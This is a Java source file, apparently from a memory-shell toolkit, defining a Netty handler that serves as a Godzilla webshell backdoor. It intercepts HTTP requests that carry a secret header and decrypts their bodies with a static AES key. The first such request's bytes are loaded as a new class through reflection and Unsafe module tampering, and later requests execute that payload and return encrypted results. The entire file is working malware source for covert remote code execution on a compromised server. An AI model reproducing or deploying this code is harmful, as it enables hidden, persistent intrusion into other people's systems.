package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufUtil;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.handler.codec.http.DefaultFullHttpResponse;
import io.netty.handler.codec.http.FullHttpResponse;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpHeaderNames;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.handler.codec.http.HttpResponseStatus;
import io.netty.handler.codec.http.HttpVersion;
import io.netty.handler.codec.http.LastHttpContent;
import io.netty.util.AttributeKey;
import io.netty.util.CharsetUtil;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * Godzilla HW NettyHandler 模板（JAVA_AES_RAW）。
 * <p>
 * 请求/响应按当前加密器处理；Netty 侧用 channel attribute 保存每个连接
 * 的请求与 body，避免 @Sharable 实例字段在并发连接间串数据。
 *
 * @author ReaJason
 */
@ChannelHandler.Sharable
public class GodzillaHwNettyHandlerRaw extends ChannelDuplexHandler {
    private final AttributeKey<Object[]> state = AttributeKey.valueOf(getClass().getName() + ".state");
    private static String key;

    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        if (msg instanceof HttpRequest) {
            HttpRequest request = (HttpRequest) msg;
            String value = request.headers().get(headerName);
            if (value == null || !value.contains(headerValue)) {
                ctx.fireChannelRead(msg);
                return;
            }
            ctx.channel().attr(state).set(new Object[]{request, new ByteArrayOutputStream()});
        }
        if (msg instanceof HttpContent) {
            Object[] current = ctx.channel().attr(state).get();
            if (current == null) {
                ctx.fireChannelRead(msg);
                return;
            }
            HttpContent httpContent = (HttpContent) msg;
            ((ByteArrayOutputStream) current[1]).write(ByteBufUtil.getBytes(httpContent.content()));
            if (httpContent instanceof LastHttpContent) {
                ctx.channel().attr(state).set(null);
                try {
                    handle(ctx, ((ByteArrayOutputStream) current[1]).toByteArray());
                } catch (Throwable e) {
                    e.printStackTrace();
                }
                return;
            }
            ctx.fireChannelRead(msg);
        }
    }

    @SuppressWarnings("all")
    private void handle(ChannelHandlerContext ctx, byte[] body) throws Exception {
        byte[] data = x(body, false);
        if (payload == null) {
            payload = reflectionDefineClass(data);
            sendBytes(ctx, new byte[0]);
            return;
        }
        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
        Object f = payload.newInstance();
        f.equals(arrOut);
        f.equals(data);
        f.toString();
        sendBytes(ctx, x(arrOut.toByteArray(), true));
    }

    private void sendString(ChannelHandlerContext ctx, String text) {
        send(ctx, Unpooled.copiedBuffer(text, CharsetUtil.UTF_8), "text/plain; charset=UTF-8");
    }

    private void sendBytes(ChannelHandlerContext ctx, byte[] bytes) {
        send(ctx, Unpooled.wrappedBuffer(bytes), "application/octet-stream");
    }

    private void send(ChannelHandlerContext ctx, ByteBuf content, String contentType) {
        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, content);
        response.headers().set(HttpHeaderNames.CONTENT_TYPE, contentType);
        response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
        ctx.channel().writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
    }

    @SuppressWarnings("all")
    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return cipher.doFinal(s);
    }

    public Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        Object unsafe = null;
        Object rawModule = null;
        long offset = 48;
        Method getAndSetObjectM = null;
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            unsafe = unsafeField.get(null);
            rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
            getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
        } catch (Throwable ignored) {
        }
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
        if (getAndSetObjectM != null) {
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
        }
        return clazz;
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
